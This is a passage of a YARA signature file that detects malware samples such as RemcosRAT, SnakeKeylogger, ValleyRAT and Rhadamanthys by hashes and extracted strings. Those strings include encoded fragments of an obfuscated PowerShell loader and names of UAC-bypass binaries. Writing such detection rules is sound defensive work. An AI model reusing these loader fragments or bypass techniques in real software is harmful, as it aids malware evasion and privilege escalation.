      $s8 = "HMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALgBNAGEAawBlAEIAeQBSA" ascii /* score: '11.00'*/
      $s9 = "CQAZwBsAG8AYgBhAGwAOgByAHUAbgB0AGkAbQBlAEQAYQB0AGEALgBuAGEAdABpAHYAZQBJAG4AdABlAHIAZgBhAGMAZQAgAD0AIAAkAHQAZQB4AHQARABlAGMAbwBkA" ascii /* score: '11.00'*/
      $s10 = "CQAbQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhA" ascii /* score: '11.00'*/
      $s11 = "GkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpA" ascii /* score: '11.00'*/
      $s12 = "GYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvA" ascii /* score: '11.00'*/
      $s13 = "EkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwA" ascii /* score: '11.00'*/
      $s14 = "EYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAdgB0A" ascii /* score: '11.00'*/
      $s15 = "G8AdABlAGMAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIAAkAHAAcgBvAHQAZQBjAHQAaQBvAG4ARABlAGwAZQBnAGEAdABlAC4ASQBuAHYAbwBrAGUAKAAkAHQAcgBhA" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6725 or uint16(0) == 0x7525 ) and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__b22d450f_RemcosRAT_signature__d96e82d9_36 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_b22d450f.vbs, RemcosRAT(signature)_d96e82d9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b22d450f1a3799f1c1d1ab6a655a8f9987b32d7d15b254fd586fb4aab34a9d65"
      hash2 = "d96e82d980a8872cb39e5ab834e00ea41f4572321f2e5c5a5aab71d3d03f3458"
   strings:
      $s1 = "ABlAG4AdABTAGMAYQBuAEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AVQB0AGkAbABpAHQAaQBlAHMALgBHAGUAdABNAGUAdABoAG8AZ" ascii /* score: '11.00'*/
      $s2 = "wBhAHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAO" ascii /* score: '11.00'*/
      $s3 = "wBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAGgAYQBuAGQAbABlAFIAZQBmAGUAcgBlAG4AYwBlACwAIAAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAKQApAA0AC" ascii /* score: '11.00'*/
      $s4 = "gB5AHQAZQBbAF0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxADQAL" ascii /* score: '11.00'*/
      $s5 = "ABuAGUAeAB0AFAAcgBvAHYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAc" ascii /* score: '11.00'*/
      $s6 = "ABzAGUAcwBzAGkAbwBuAFAAcgBvAHAAZQByAHQAeQAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAJ" ascii /* score: '11.00'*/
      $s7 = "ABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAG0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0AGEAL" ascii /* score: '11.00'*/
      $s8 = "gBvAHIAZQBhAGMAaAAgACgAJABjAHUAcgByAGUAbgB0AFAAcgBvAHYAaQBkAGUAcgAgAGkAbgAgACQAYQB2AGEAaQBsAGEAYgBsAGUAUAByAG8AdgBpAGQAZQByAHMAK" ascii /* score: '11.00'*/
      $s9 = "ABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZ" ascii /* score: '11.00'*/
      $s10 = "wBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbABpAGIAcgBhAHIAeQBIAGEAbgBkAGwAZ" ascii /* score: '11.00'*/
      $s11 = "QB6AGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnAHIAb" ascii /* score: '11.00'*/
      $s12 = "wBuAEEAZABkAHIAZQBzAHMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0AHAAd" ascii /* score: '11.00'*/
      $s13 = "QBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB2AHQAY" ascii /* score: '11.00'*/
      $s14 = "QBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0AL" ascii /* score: '11.00'*/
      $s15 = "QBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAd" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6157 or uint16(0) == 0x6c50 ) and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_37 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "&GetFieldBypassCctor&SetFieldBypassCctor@" fullword ascii /* score: '20.00'*/
      $s2 = "\"UncheckedGetField\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
      $s3 = ".ExecutionAndPublication@" fullword ascii /* score: '19.00'*/
      $s4 = "ChangeType operation is not supported" fullword wide /* score: '17.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Reflection.EventInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Reflection.EventInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "WIN32_FIND_DATA:TIME_DYNAMIC_ZONE_INFORMATION PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s10 = "BGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '15.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<System.Reflection.PropertyInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<System.Reflection.CustomAttributeData>.get_Current@" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<System.Reflection.PropertyInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerable<System.Reflection.MethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<System.Reflection.CustomAttributeData>.GetEnumerator@" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4f7cc3de_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_38 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4f7cc3de.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_edaba79c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f7cc3de696e7c5e88e25625fe77f08c6472ff0581d4cc03c6c0c3204f7be784"
      hash2 = "edaba79c3d43a416a86003f336d879ed3a513aa24dd401340584615647ed6da2"
   strings:
      $s1 = "users.txt" fullword wide /* score: '22.00'*/
      $s2 = "readlogindata" fullword ascii /* score: '19.00'*/
      $s3 = "get_UsersData" fullword ascii /* score: '17.00'*/
      $s4 = "get_download__1_1" fullword ascii /* score: '15.00'*/
      $s5 = "get_download__1_" fullword ascii /* score: '15.00'*/
      $s6 = "Please select another password ! It's already taken" fullword wide /* score: '15.00'*/
      $s7 = "items.txt" fullword wide /* score: '14.00'*/
      $s8 = "usersDL" fullword ascii /* score: '12.00'*/
      $s9 = "get_d1dd6ce6a7c22b060352c18cbe9581f3__borders_and_frames_stationary_items" fullword ascii /* score: '12.00'*/
      $s10 = "usersData" fullword ascii /* score: '12.00'*/
      $s11 = "addUsersIntoList" fullword ascii /* score: '12.00'*/
      $s12 = "set_UsersData" fullword ascii /* score: '12.00'*/
      $s13 = "Users Data not Loaded succesfully !" fullword wide /* score: '12.00'*/
      $s14 = "Enter your password (Only 8 Characters): " fullword wide /* score: '12.00'*/
      $s15 = "Enter your password : " fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imph_39 {
   meta:
      description = "_subset_batch - from files SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0f1b3601.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_bdca7eab.exe, VenomRAT(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91c48122fad932eb549ca8cf2734a73b21a5b4b2aefe3d86e675586d2ee091b0"
      hash2 = "0f1b3601c91c1a1de03108c26a491f567ad3c0603313e5b5b0f2a530984ccc92"
      hash3 = "bdca7eabc43d49ace207da10ffafcebbcd4fb26e4a779339878386953b5da6d3"
      hash4 = "94ab9f0a1b7cdd5287aef8ac76e6071a0f25884c15c71079c40c5be355ce3a9e"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s4 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s5 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s6 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s7 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s8 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s9 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s10 = "Failed to initialize security descriptor for temporary directory!" fullword ascii /* score: '20.00'*/
      $s11 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s12 = "Failed to execute script '%ls' due to unhandled exception: %ls" fullword wide /* score: '20.00'*/
      $s13 = "LOADER: failed to set the TMP environment variable." fullword wide /* score: '19.00'*/
      $s14 = "Failed to create child process!" fullword wide /* score: '18.00'*/
      $s15 = "Failed to extract %s: decompression resulted in return code %d!" fullword ascii /* score: '15.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__aa4eb9fdeff2aa13951b349b94f4f6ef_imphash__ValleyRAT_signature__ce09579c3721886d9041e964bc6aebf4_imphas_40 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_aa4eb9fdeff2aa13951b349b94f4f6ef(imphash).exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash).exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash)_265735e5.exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash)_9ef8d59c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6e077a0d195558a6dbe2f78349db94ccddff1513a92288b9a1408256267560e7"
      hash2 = "e92228707cbc2a07b773bd2bf2c68f90c3df82fa35d9e439aaa30c4857546e1c"
      hash3 = "265735e522bc53a016b41c94ce8e3386015022d9ade19e8a91b7ce4010f2ba4b"
      hash4 = "9ef8d59c6d415a64123ad4202416093b6a4b71b495e3754eae10efcaa5ce46fa"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii /* score: '50.00'*/
      $x2 = "iscsiexe.dll" fullword wide /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
      $s3 = "\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"fals" ascii /* score: '26.00'*/
      $s4 = "wow64log.dll" fullword wide /* score: '25.00'*/
      $s5 = "computerdefaults.exe" fullword wide /* score: '25.00'*/
      $s6 = "ency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" publicKe" ascii /* score: '24.00'*/
      $s7 = "BluetoothDiagnosticUtil.dll" fullword wide /* score: '23.00'*/
      $s8 = "yIdentity type=\"win32\" name=\"Akagi\" version=\"1.0.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Akagi wa" ascii /* score: '22.00'*/
      $s9 = "fodhelper.exe" fullword wide /* score: '22.00'*/
      $s10 = "WSReset.exe" fullword wide /* score: '22.00'*/
      $s11 = "Akagi.exe" fullword wide /* score: '22.00'*/
      $s12 = "api-ms-win-core-kernel32-legacy-l1.DLL" fullword wide /* score: '20.00'*/
      $s13 = "ATL.dll" fullword wide /* score: '20.00'*/
      $s14 = ")explorer.exe" fullword wide /* score: '19.00'*/
      $s15 = "  2014 - 2023 Fraudware Scripting, Florian Roth" fullword wide /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_41 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash5 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s2 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s7 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s8 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s9 = "sync/atomic.CompareAndSwapPointer" fullword ascii /* score: '11.00'*/
      $s10 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s11 = "sync/atomic.CompareAndSwapUintptr" fullword ascii /* score: '11.00'*/
      $s12 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s13 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
      $s14 = "erroring" fullword ascii /* score: '11.00'*/
      $s15 = "runtime.stopTheWorldGC" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1140784c_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_42 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1140784c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_23679efa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1140784c476e403857dbda36c5091358e6ba70b140a0d3ce438abff8f705d79c"
      hash2 = "23679efa5468f8e0e11d24d4a2e6408f13c5982664fc3025c6e3c2e8b34a4660"
   strings:
      $s1 = "ExecuteArpCommand" fullword ascii /* score: '26.00'*/
      $s2 = "DNS flush command executed. Check command prompt for results." fullword wide /* score: '22.00'*/
      $s3 = "IP renewal command executed. This may take a moment to complete." fullword wide /* score: '22.00'*/
      $s4 = "Note: Full routing table display requires elevated privileges." fullword wide /* score: '19.00'*/
      $s5 = "Scan Completed: {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '13.00'*/
      $s6 = "This will attempt to renew IP configuration. Continue?" fullword wide /* score: '13.00'*/
      $s7 = "get_OpenPorts" fullword ascii /* score: '12.00'*/
      $s8 = "Error scanning network: {0}" fullword wide /* score: '12.00'*/
      $s9 = "ScanCommonPorts" fullword ascii /* score: '11.00'*/
      $s10 = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True" fullword wide /* score: '11.00'*/
      $s11 = "/c ipconfig /flushdns" fullword wide /* score: '11.00'*/
      $s12 = "/c ipconfig /release & ipconfig /renew" fullword wide /* score: '11.00'*/
      $s13 = "SmartNetworkAnalyzer.Forms.NetworkConfigForm.resources" fullword ascii /* score: '10.00'*/
      $s14 = "Ping failed: {0}" fullword wide /* score: '10.00'*/
      $s15 = "Scanning common ports..." fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_i_43 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '22.00'*/
      $s2 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s3 = "ExecutionDomain" fullword ascii /* score: '16.00'*/
      $s4 = "4<FindPrefix>g__Process|1_0" fullword ascii /* score: '15.00'*/
      $s5 = "8get_IsVectorizationSupported&ComputeAnyByteState" fullword ascii /* score: '15.00'*/
      $s6 = "ion>g__ProcessOneOrMulti|42_4" fullword ascii /* score: '15.00'*/
      $s7 = "IdManager$FinalizationHelper\"WorkStealingQueue(QueueProcessingStage" fullword ascii /* score: '15.00'*/
      $s8 = "TLoader" fullword ascii /* score: '13.00'*/
      $s9 = "@get_RuntimeGenericTypeParameters2get_SyntheticConstructors@" fullword ascii /* score: '12.00'*/
      $s10 = "&GetComponentsHelper" fullword ascii /* score: '12.00'*/
      $s11 = "LTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '12.00'*/
      $s12 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '11.00'*/
      $s13 = ",IRuntimeMethodCommon`1" fullword ascii /* score: '10.00'*/
      $s14 = ".TryGetUnicodeEquivalent" fullword ascii /* score: '9.00'*/
      $s15 = " GetMintermFromId" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__374c0585_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_44 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_374c0585.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_585f964a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af3c9677.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bb17aae7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "374c0585a847123b53c6a0882073830abf04829ecb038e0bdad00cf458bd16ee"
      hash2 = "585f964ab32e7e8b968f4d6f3c8395d757abc7bd22afc3ea04f31fd381fb4c5e"
      hash3 = "af3c9677ddb4f4989eefa3f4dbc7c2c61067adfde4203b106939e13def66ba22"
      hash4 = "bb17aae78c989184f3618223ea0e06d307fee6a6467ba61bb4b9e15ca42cf06c"
   strings:
      $s1 = "<GetTasksCompletedToday>b__19_0" fullword ascii /* score: '12.00'*/
      $s2 = "GetCompletedTasks" fullword ascii /* score: '12.00'*/
      $s3 = "GetCommonTasks" fullword ascii /* score: '12.00'*/
      $s4 = "GetTasksCompletedToday" fullword ascii /* score: '12.00'*/
      $s5 = "<GetCompletedTasks>b__10_0" fullword ascii /* score: '12.00'*/
      $s6 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s7 = "<GetCompletedTasks>b__10_1" fullword ascii /* score: '12.00'*/
      $s8 = "Daily Planner - Smart Task Manager" fullword wide /* score: '12.00'*/
      $s9 = "Settings - Daily Planner" fullword wide /* score: '12.00'*/
      $s10 = "Milk, bread, eggs, vegetables for the week" fullword wide /* score: '12.00'*/
      $s11 = "btnHealthTemplate" fullword wide /* score: '11.00'*/
      $s12 = "buttonTemplate_Click" fullword ascii /* score: '11.00'*/
      $s13 = "btnShoppingTemplate" fullword wide /* score: '11.00'*/
      $s14 = "btnWorkTemplate" fullword wide /* score: '11.00'*/
      $s15 = "groupBoxTemplates" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__45 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash3 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash4 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash5 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash6 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash7 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash8 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash9 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
